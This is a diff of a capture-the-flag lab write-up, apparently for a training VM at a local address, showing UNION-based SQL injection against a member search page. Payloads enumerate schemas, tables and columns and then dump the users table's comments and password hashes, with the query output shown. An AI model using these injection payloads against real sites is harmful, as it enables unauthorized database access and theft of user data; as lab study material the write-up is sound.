@@ -4,78 +4,94 @@ __http://192.168.56.101/?page=member&id=1&Submit=Submit__
 
 ## Description
 This page allow to find the members of the service.
+
 ## Form Outputs
-The [page](#http://192.168.56.101/?page=member&id=42%20union%20select%20database(),%20schema_name%20from%20information_schema.schemata&Submit=Submit) return the list of members
+
+https://www.mssqltips.com/sqlservertutorial/196/information-schema-tables/ - main table information
+
+1) 1 union select table_name, table_schema from iNFORMATION_SCHEMA.TABLES - see all schema names and their tables
+
+2) 1 union select table_name, column_name from iNFORMATION_SCHEMA.columns - see all tables and their columns
+
+3) find column username, password and see what tables in it
+
+Member_Sql_Injection
+
+1 union all select null from Member_Sql_Injection
+
+1 union all select table_schema FROM information_schema.tables WHERE table_name = 'Member_Sql_Injection'
+
+The [page](#http://192.168.56.101/?page=member&id=1%20union%20select%20database(),%20schema_name%20from%20information_schema.schemata&Submit=Submit) return the list of members
 
 ```
-ID: 42 union select database(), schema_name from information_schema.schemata 
+ID: 1 union select database(), schema_name from information_schema.schemata 
 First name: Member_Sql_Injection
 Surname : Member_Brute_Force
-ID: 42 union select database(), schema_name from information_schema.schemata 
+ID: 1 union select database(), schema_name from information_schema.schemata 
 First name: Member_Sql_Injection
 Surname : Member_Sql_Injection
-ID: 42 union select database(), schema_name from information_schema.schemata 
+ID: 1 union select database(), schema_name from information_schema.schemata 
 First name: Member_Sql_Injection
 Surname : Member_guestbook
-ID: 42 union select database(), schema_name from information_schema.schemata 
+ID: 1 union select database(), schema_name from information_schema.schemata 
 First name: Member_Sql_Injection
 Surname : Member_images
-ID: 42 union select database(), schema_name from information_schema.schemata 
+ID: 1 union select database(), schema_name from information_schema.schemata 
 First name: Member_Sql_Injection
 Surname : Member_survey
 ```
 
-The [page](#http://192.168.56.101/?page=member&id=42%20union%20select%20table_name,%20create_time%20from%20information_schema.tables%20where%20table_schema=database()&Submit=Submit) return the list of the tables
+The [page](#http://192.168.56.101/?page=member&id=1%20union%20select%20table_name,%20create_time%20from%20information_schema.tables%20where%20table_schema=database()&Submit=Submit) return the list of the tables
 
 ```
-ID: 42 union select table_name, create_time from information_schema.tables where table_schema=database() 
+ID: 1 union select table_name, create_time from information_schema.tables where table_schema=database() 
 First name: users
 Surname : 2021-06-29 20:14:31
 ```
 
-Let's check the column names [here](#http://192.168.56.101/?page=member&id=42%20union%20select%20column_name,%20column_type%20from%20information_schema.columns%20where%20table_schema=database()&Submit=Submit)
+Let's check the column names [here](#http://192.168.56.101/?page=member&id=1%20union%20select%20column_name,%20column_type%20from%20information_schema.columns%20where%20table_schema=database()&Submit=Submit)
 
 ```
-ID: 42 union select column_name, column_type from information_schema.columns where table_schema=database() 
+ID: 1 union select column_name, column_type from information_schema.columns where table_schema=database() 
 First name: user_id
 Surname : int(11)
-ID: 42 union select column_name, column_type from information_schema.columns where table_schema=database() 
+ID: 1 union select column_name, column_type from information_schema.columns where table_schema=database() 
 First name: first_name
 Surname : varchar(255)
-ID: 42 union select column_name, column_type from information_schema.columns where table_schema=database() 
+ID: 1 union select column_name, column_type from information_schema.columns where table_schema=database() 
 First name: last_name
 Surname : varchar(255)
-ID: 42 union select column_name, column_type from information_schema.columns where table_schema=database() 
+ID: 1 union select column_name, column_type from information_schema.columns where table_schema=database() 
 First name: town
 Surname : varchar(255)
-ID: 42 union select column_name, column_type from information_schema.columns where table_schema=database() 
+ID: 1 union select column_name, column_type from information_schema.columns where table_schema=database() 
 First name: country
 Surname : varchar(255)
-ID: 42 union select column_name, column_type from information_schema.columns where table_schema=database() 
+ID: 1 union select column_name, column_type from information_schema.columns where table_schema=database() 
 First name: planet
 Surname : varchar(255)
-ID: 42 union select column_name, column_type from information_schema.columns where table_schema=database() 
+ID: 1 union select column_name, column_type from information_schema.columns where table_schema=database() 
 First name: Commentaire
 Surname : varchar(255)
-ID: 42 union select column_name, column_type from information_schema.columns where table_schema=database() 
+ID: 1 union select column_name, column_type from information_schema.columns where table_schema=database() 
 First name: countersign
 Surname : varchar(255)
 ```
 We've got the following columns ```user_id first_name last_name town country planet Commentaire countersign```
 
 Then we get the personal data </br>
-[select Commentaire, countersign from users](#http://192.168.56.101/?page=member&id=42%20union%20select%20Commentaire,%20countersign%20from%20users&Submit=Submit)
+[select Commentaire, countersign from users](#http://192.168.56.101/?page=member&id=1%20union%20select%20Commentaire,%20countersign%20from%20users&Submit=Submit)
 ```
-ID: 42 union select Commentaire, countersign from users 
+ID: 1 union select Commentaire, countersign from users 
 First name: Je pense, donc je suis
 Surname : 2b3366bcfd44f540e630d4dc2b9b06d9
-ID: 42 union select Commentaire, countersign from users 
+ID: 1 union select Commentaire, countersign from users 
 First name: Aamu on iltaa viisaampi.
 Surname : 60e9032c586fb422e2c16dee6286cf10
-ID: 42 union select Commentaire, countersign from users 
+ID: 1 union select Commentaire, countersign from users 
 First name: Dublin is a city of stories and secrets.
 Surname : e083b24a01c483437bcf4a9eea7c1b4d
-ID: 42 union select Commentaire, countersign from users 
+ID: 1 union select Commentaire, countersign from users 
 First name: Decrypt this password -> then lower all the char. Sh256 on it and it's good !
 Surname : 5ff9d0165b4f92b14994e5c685cdce28
 ```
